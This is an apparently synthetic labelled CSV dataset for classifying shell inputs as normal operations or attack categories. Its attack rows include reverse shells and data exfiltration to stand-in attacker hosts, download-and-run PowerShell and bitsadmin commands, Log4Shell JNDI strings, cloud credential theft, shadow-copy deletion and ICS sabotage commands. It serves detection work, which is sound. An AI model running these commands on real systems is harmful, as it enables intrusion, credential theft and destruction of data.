timestamp,src_ip,input,label
2026-01-20T18:06:49.650820,187.44.207.122,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.625345,194.111.60.149,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.624262,221.127.83.187,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.587562,19.234.172.66,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.646819,127.85.26.203,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.625855,90.241.228.47,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,166.202.24.100,git status,Normal_Business_Ops
2026-01-20T18:06:49.575395,41.148.125.176,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.645231,13.50.184.19,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.637464,219.249.237.109,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.615344,99.66.117.166,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.586561,125.36.140.41,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.619742,46.50.83.218,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.625855,12.120.33.245,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.581995,198.214.71.144,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.636464,120.144.164.77,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.578927,27.201.49.94,git add .,Normal_Business_Ops
2026-01-20T18:06:49.605716,157.235.27.168,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.619055,53.17.155.8,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.650820,118.22.132.101,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.633463,17.152.158.143,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.642230,198.37.142.80,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.593923,139.86.244.138,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.630463,189.130.108.77,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.619742,168.108.138.60,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.639724,56.47.186.140,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.649821,148.196.176.9,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.586561,71.224.111.239,git pull,Normal_Business_Ops
2026-01-20T18:06:49.619742,161.219.113.219,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.651526,127.34.31.51,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.592928,146.172.25.252,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.621712,142.231.193.47,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.609343,157.165.201.126,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.620713,191.63.229.17,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.634463,160.194.86.45,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.591206,36.11.56.196,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.592206,175.78.90.71,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.601211,176.63.210.155,git branch,Normal_Business_Ops
2026-01-20T18:06:49.615344,140.128.51.44,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.605716,122.103.117.216,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.646819,50.170.87.70,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.638465,149.81.135.53,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.649821,134.120.143.19,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.605716,153.205.189.236,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.611343,214.139.140.23,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.648870,69.79.68.48,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.609343,32.59.12.141,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.583995,205.250.107.61,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.646819,183.159.230.34,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.616344,91.156.164.182,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.576420,122.90.240.107,git status,Normal_Business_Ops
2026-01-20T18:06:49.595541,185.143.130.22,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.638465,152.143.19.218,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.601211,105.122.27.150,git status,Normal_Business_Ops
2026-01-20T18:06:49.633463,162.189.250.114,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.575395,188.123.65.193,git status,Normal_Business_Ops
2026-01-20T18:06:49.652043,10.150.151.59,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.607717,109.74.234.201,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.636464,141.174.232.247,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.636464,165.166.71.81,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.587562,156.4.56.228,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.606716,70.140.168.188,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.583995,57.138.237.194,npm start,Normal_Business_Ops
2026-01-20T18:06:49.586561,123.216.252.181,whoami,Normal_Business_Ops
2026-01-20T18:06:49.647820,77.206.150.46,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.632463,187.247.26.193,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.623750,102.109.108.23,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.655635,198.9.53.31,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.588562,136.66.138.15,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.645231,67.9.78.103,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.577927,139.126.244.81,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.602715,191.42.135.104,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.627851,150.165.189.200,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.581995,181.40.78.14,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.603716,6.55.44.192,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.578927,196.124.41.251,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.605716,198.108.123.247,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.614343,188.30.5.144,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.606716,87.235.47.51,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.578927,188.158.177.118,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.590224,212.3.228.50,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.652043,119.175.61.252,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.593923,69.59.145.21,netstat -tulpn,Normal_Business_Ops
2026-01-20T18:06:49.637464,40.153.81.143,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.628852,223.202.33.22,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.635464,139.128.22.198,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.634463,107.2.3.64,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.652043,116.203.222.18,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.581995,217.80.146.101,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.646819,56.199.150.184,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.646819,164.134.13.248,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.647820,139.209.246.74,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.624262,184.185.28.101,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.646819,142.20.75.240,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.626851,85.22.210.46,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.650820,90.199.65.149,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.625855,171.36.120.140,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.577927,152.20.176.171,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.642230,172.216.80.121,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.594923,65.200.252.95,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T18:06:49.630463,186.206.94.52,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.615344,172.105.56.155,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655635,195.210.231.52,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.621712,203.130.9.102,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.608346,177.76.110.201,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.619055,182.173.15.104,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.630463,126.209.9.177,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.596536,62.99.82.44,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.652043,120.92.165.247,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.655635,122.100.123.70,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.621712,189.199.8.232,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,186.234.92.82,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.626851,90.229.49.193,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.643231,50.66.105.211,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.596536,108.126.25.230,git branch,Normal_Business_Ops
2026-01-20T18:06:49.591206,185.59.52.118,git branch,Normal_Business_Ops
2026-01-20T18:06:49.643231,22.17.211.246,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.603716,6.212.61.179,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.645823,182.80.234.219,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.612343,100.103.128.132,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.648870,84.65.27.79,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,86.58.146.181,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.654031,126.209.219.217,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.621712,148.52.157.6,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.619742,167.195.76.198,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.578927,38.162.85.199,pip install requests,Normal_Business_Ops
2026-01-20T18:06:49.655127,209.195.58.211,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.618055,108.212.26.141,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.636464,203.9.146.43,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.578927,171.124.254.240,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.644231,1.166.117.201,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.650820,24.160.130.4,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.655127,211.110.234.215,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.602715,65.218.17.153,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.636464,217.52.196.198,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.576929,191.178.222.55,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.631464,28.40.11.133,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.635464,51.127.233.220,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.610343,96.17.113.58,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.655635,178.123.119.93,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.652043,76.20.191.168,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.619055,119.218.238.57,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.618055,70.169.145.234,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.597537,40.14.2.193,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.594923,11.122.206.85,uptime,Normal_Business_Ops
2026-01-20T18:06:49.656632,195.34.153.246,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.590224,141.132.192.105,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.624765,5.136.57.18,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.644231,28.133.188.187,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.603716,30.249.210.12,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.648870,52.210.131.63,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.640252,107.200.237.66,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.651526,212.183.125.250,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.608346,216.64.74.166,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.599537,23.254.6.170,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.618055,9.174.186.124,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.633463,222.102.136.246,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.651526,110.218.246.220,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.587562,158.233.144.202,git status,Normal_Business_Ops
2026-01-20T18:06:49.612343,51.48.10.1,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.580995,132.60.17.87,whoami,Normal_Business_Ops
2026-01-20T18:06:49.635464,11.132.246.233,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.640252,49.156.193.198,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.581995,138.22.247.153,df -h,Normal_Business_Ops
2026-01-20T18:06:49.630463,142.34.2.106,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.589562,136.8.36.122,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.577927,40.167.113.78,whoami,Normal_Business_Ops
2026-01-20T18:06:49.580022,29.228.7.44,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.576929,40.12.155.47,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.585564,138.151.88.254,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.594923,102.134.166.246,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.622713,106.252.115.189,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.591206,97.125.73.232,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.583995,108.228.51.8,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T18:06:49.597537,71.150.201.71,make build,Normal_Business_Ops
2026-01-20T18:06:49.589562,216.102.231.242,git branch,Normal_Business_Ops
2026-01-20T18:06:49.629483,107.186.114.72,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.599537,75.56.238.72,uptime,Normal_Business_Ops
2026-01-20T18:06:49.646819,27.111.66.116,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.584995,35.124.140.52,npm start,Normal_Business_Ops
2026-01-20T18:06:49.654619,117.165.61.194,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.654619,170.194.216.163,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.578927,25.52.251.247,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.648870,108.127.215.3,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
